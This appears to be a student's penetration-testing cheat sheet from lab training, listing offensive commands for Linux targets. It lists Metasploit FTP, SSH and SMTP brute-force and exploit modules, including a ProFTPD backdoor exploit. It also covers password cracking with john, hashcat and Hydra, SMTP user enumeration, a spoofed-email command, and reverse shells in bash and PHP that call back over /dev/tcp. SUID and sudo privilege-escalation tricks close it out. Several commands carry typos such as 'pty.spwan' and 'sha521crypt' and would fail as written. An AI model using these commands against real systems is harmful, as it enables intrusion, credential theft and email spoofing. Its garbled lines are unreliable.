
**Version**
- uname -r

**File**
- /etc/passwd (user)
- /etc/group (group)
- /etc/crons.d (job)
- /etc/resolvs.f (dns)
						
**Curl**
- curl -i url
- curl -O ip/file
- wget ip/file

**FTP**

	**Login**
	- ftp ip or domain, username: anonymous
	- ftp ip or domain port
	
	**Search Type in metasploit**
	- limit the result of search in msf: search type:auxiliary name:ftp
	
	**Metasploit-framework**
	- auxiliary/scanner/ftp/ftp_version
	- auxiliary/scanner/ftp/ftp_login (bruteforce) (use users&password file)
	- auxiliary/scanner/ftp/anonymous
	
	**User&Password List**
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt (USER FILE)
	- /usr/share/metasploit-framework/data/wordlists/unix_passwords.txt(PASSWORD FILE)

	**ProFTPD**
	-exploit/unix/ftp/proftpd_modcopy_exec
	-exploit/unix/ftp/proftpd_133c_backdoor

**Hash Crack**
-post/linux/gather/hashdump
-john --format=sha521crypt file_name --wordlist=/usr/share/wordlists/rockyou.txt
-hashcat -a3 -m 1800 file_name /usr/share/wordlists/rockyou.txt

**SSH**

	**Metasploit-framework**
	- auxiliary/scanner/ssh/ssh_version
	- auxiliary/scanner/ssh/ssh_login (use users&password file below)
	- auxiliary/scanner/ssh/ssh_enumusers
	- /bin/bash -i (change to terminal)

	**Login to user account**
	- ssh ip or domain
	- ssh user@ip
	
	**User&Password List**
	- /usr/share/metasploit-framework/data/wordlists/common_users.txt
	- /usr/share/metasploit-framework/data/wordlists/common_passwords.txt

**SMTP**

	**Metasploit-framework**
	- auxiliary/scanner/smtp/smtp_version
	- auxiliary/scanner/smtp/smtp_enum (User Enumeration)
	
	**Nmap**
	- nmap -A -script banner domain (retrive hostname of server)

	**Netcat**
	- nc domain 25(port)
		- VFRY admin@hostname of server (to verify user admin exist or not)
		
	**Telnet**
		- telnet domain 25
			- HELO attacker.xyz
			- EHLO attacker.xyz

	**List Username**
		- smtp-user-enum -U /usr/share/commix/src/txt/usernames.txt -t domain

	**Send Fake Mail**
		- sendemail -f admin@attacker.xyz -t root@openmailbox.xyz -s demo.ine.local -u Fakemail -m "Hi root, a fake from admin" -o tls=no

**Hydra**

- hydra -L user_file -P pass_file protocol://ip
- hydra -l username -P pass_file protocol://ip:port 
- /usr/share/wordlists/metasploit/common_users.txt 
- /usr/share/wordlists/metasploit/common_passwords.txt


**Enum4linux**
	-enum4linux -a ip
	-enum4linux -a -u user -p password ip


**Pwned Shell**
-/bin/bash -i
-python -c 'import pty; pty.spwan("/bin/bash")'
-echo os.system('/bin/bash')
-/bin/sh -i
-bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1
<?php exec("/bin/bash -c 'bash -i >& /dev/tcp/<TARGET_IP>/4444 0>&1'"); ?>
-/usr/bin/script -qc /bin/bash /dev/null
-perl -e 'exec "/bin/sh";'
-perl: exec "/bin/sh";
-ruby: exec "/bin/sh"
-lua: os.execute('/bin/sh')
-IRB: exec "/bin/sh"
-vi: :!bash
-vi: :set shell=/bin/bash:shell
-nmap: !sh

**Privilege Escalation**

	**SUID**
	-find / -perm -u=s -type f 2>/dev/null
	-find / -perm -4000 2>/dev/null (check for executable)

-sudo -l (find permission)

-cat /etc/shells (to checking the shells available)
-cat /etc/shells | while read shell; do ls -l $shell 2>/dev/null; done

-find / -exec /bin/rbash -p \; -quit
-sudo man vim (when see (root) NOPASSWD: /usr/bin/man)

**Openssl**
-openssl passwd -1 -salt abc password (used to generate a hash password)


**Crontab**

![[Screenshot 2025-11-01 at 1.18.33 in the afternoon.png]]

![[Screenshot 2025-11-01 at 1.23.54 in the afternoon.png]]

**SUID (/lib64/ld-linux-x86-64.so.2)**


![[Screenshot 2025-11-01 at 1.42.05 in the afternoon.png]]

![[Screenshot 2025-11-01 at 1.42.58 in the afternoon.png]]


**Local Server**

![[Screenshot 2025-11-03 at 3.05.26 in the afternoon.png]]